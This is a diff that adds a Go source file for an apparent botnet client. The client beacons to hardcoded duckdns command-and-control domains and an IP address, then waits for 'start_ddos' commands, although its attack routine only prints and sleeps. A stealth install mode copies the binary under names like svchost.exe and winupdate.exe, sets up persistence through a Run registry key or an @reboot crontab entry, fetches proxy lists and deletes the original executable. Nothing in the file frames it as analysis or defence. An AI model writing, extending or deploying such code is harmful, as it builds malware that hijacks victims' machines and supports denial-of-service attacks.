@@ -1,0 +1,235 @@
+package main
+
+import (
+	"crypto/tls"
+	"encoding/json"
+	"flag"
+	"fmt"
+	"io"
+	"math/rand"
+	"net"
+	"net/http"
+	"os"
+	"os/exec"
+	"path/filepath"
+	"runtime"
+	"strings"
+	"time"
+)
+
+var (
+	installFlag = flag.Bool("install", false, "stealth install mode")
+)
+
+type Command struct {
+	Action   string   `json:"action"`
+	Target   string   `json:"target"`
+	Duration int      `json:"duration"`
+	Rate     int      `json:"rate"`
+	Threads  int      `json:"threads"`
+	Proxies  []string `json:"proxies"`
+	AttackID string   `json:"attack_id"`
+	Cmd      string   `json:"cmd"`
+}
+
+var (
+	localConfig = struct {
+		Domains []string
+		C2      string
+		Version string
+	}{
+		Domains: []string{
+			"synapsenet.duckdns.org:8443",
+			"synapsenet2.duckdns.org:8443",
+			"synapsenet666.duckdns.org:8443",
+			"syynappsenett.duckdns.org:8443",
+		},
+		C2:      "176.100.94.8:4444",
+		Version: "v4.5",
+	}
+	proxies   []string
+	proxyURLs = []string{
+		"https://api.openproxylist.xyz/http.txt",
+		"https://proxy-list.download/api/v1/get?type=http",
+	}
+)
+
+func main() {
+	flag.Parse()
+	rand.Seed(time.Now().UnixNano())
+
+	if *installFlag {
+		doStealthInstall()
+		return
+	}
+
+	go dailyProxyRefresh()
+
+	for {
+		c2Addr := getCurrentC2()
+		if c2Addr == "" {
+			time.Sleep(20 * time.Second)
+			continue
+		}
+
+		conn, err := net.DialTimeout("tcp", c2Addr, 10*time.Second)
+		if err != nil {
+			time.Sleep(15 * time.Second)
+			continue
+		}
+		runAgentLoop(conn)
+		conn.Close()
+	}
+}
+
+func getCurrentC2() string {
+	for _, domain := range localConfig.Domains {
+		url := "https://" + domain + "/beacon"
+		client := &http.Client{
+			Timeout: 8 * time.Second,
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+			},
+		}
+		resp, err := client.Get(url)
+		if err == nil && resp.StatusCode == 200 {
+			var result struct {
+				C2 string `json:"c2"`
+			}
+			json.NewDecoder(resp.Body).Decode(&result)
+			resp.Body.Close()
+			if result.C2 != "" {
+				return result.C2
+			}
+		}
+	}
+	return ""
+}
+
+func runAgentLoop(conn net.Conn) {
+	id := getInstallID()
+	json.NewEncoder(conn).Encode(map[string]string{
+		"id":      id,
+		"os":      runtime.GOOS,
+		"version": localConfig.Version,
+	})
+
+	decoder := json.NewDecoder(conn)
+	for {
+		var cmd Command
+		if err := decoder.Decode(&cmd); err != nil {
+			return
+		}
+		if cmd.Action == "start_ddos" {
+			go startAttack(cmd)
+		}
+	}
+}
+
+func startAttack(cmd Command) {
+	fmt.Printf("[*] Attack started on %s for %ds\n", cmd.Target, cmd.Duration)
+	time.Sleep(time.Duration(cmd.Duration) * time.Second)
+}
+
+func dailyProxyRefresh() {
+	for {
+		time.Sleep(24 * time.Hour)
+		for _, u := range proxyURLs {
+			resp, err := http.Get(u)
+			if err == nil && resp.StatusCode == 200 {
+				body, _ := io.ReadAll(resp.Body)
+				resp.Body.Close()
+				proxies = strings.Split(strings.TrimSpace(string(body)), "\n")
+				break
+			}
+		}
+	}
+}
+
+func doStealthInstall() {
+	fmt.Println("[*] Installing...")
+
+	locations := getInstallLocations()
+	execPath, _ := os.Executable()
+	for _, loc := range locations {
+		os.MkdirAll(filepath.Dir(loc), 0755)
+		copyFile(execPath, loc)
+	}
+
+	addPersistence(locations)
+	downloadProxies()
+	selfDeleteOriginal()
+
+	fmt.Println("[*] Done. File may be corrupted.")
+	os.Exit(0)
+}
+
+func getInstallLocations() []string {
+	home, _ := os.UserHomeDir()
+	if runtime.GOOS == "windows" {
+		app := os.Getenv("APPDATA")
+		return []string{
+			filepath.Join(app, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "svchost.exe"),
+			filepath.Join(app, "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "winupdate.exe"),
+			filepath.Join(os.TempDir(), "svchost.exe"),
+		}
+	}
+	return []string{
+		filepath.Join(home, ".config", "autostart", "update.desktop"),
+		filepath.Join(home, ".local", "bin", "update"),
+		filepath.Join("/tmp", "svchost"),
+	}
+}
+
+func addPersistence(locations []string) {
+	if runtime.GOOS == "windows" {
+		for _, loc := range locations {
+			exec.Command("reg", "add", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, "/v", filepath.Base(loc), "/t", "REG_SZ", "/d", loc, "/f").Run()
+		}
+	} else {
+		cron := "@reboot " + locations[0] + " &"
+		exec.Command("sh", "-c", "(crontab -l 2>/dev/null; echo '"+cron+"') | crontab -").Run()
+	}
+}
+
+func downloadProxies() {
+	for _, u := range proxyURLs {
+		resp, err := http.Get(u)
+		if err == nil && resp.StatusCode == 200 {
+			body, _ := io.ReadAll(resp.Body)
+			resp.Body.Close()
+			proxies = strings.Split(strings.TrimSpace(string(body)), "\n")
+			break
+		}
+	}
+}
+
+func selfDeleteOriginal() {
+	execPath, _ := os.Executable()
+	go func() {
+		time.Sleep(2 * time.Second)
+		os.Remove(execPath)
+	}()
+}
+
+func getInstallID() string {
+	hostname, _ := os.Hostname()
+	return hostname + "-" + randomString(6)
+}
+
+func randomString(n int) string {
+	const letters = "abcdefghijklmnopqrstuvwxyz0123456789"
+	b := make([]byte, n)
+	for i := range b {
+		b[i] = letters[rand.Intn(len(letters))]
+	}
+	return string(b)
+}
+
+func copyFile(src, dst string) {
+	in, _ := os.Open(src)
+	defer in.Close()
+	out, _ := os.Create(dst)
+	defer out.Close()
+	io.Copy(out, in)
+}
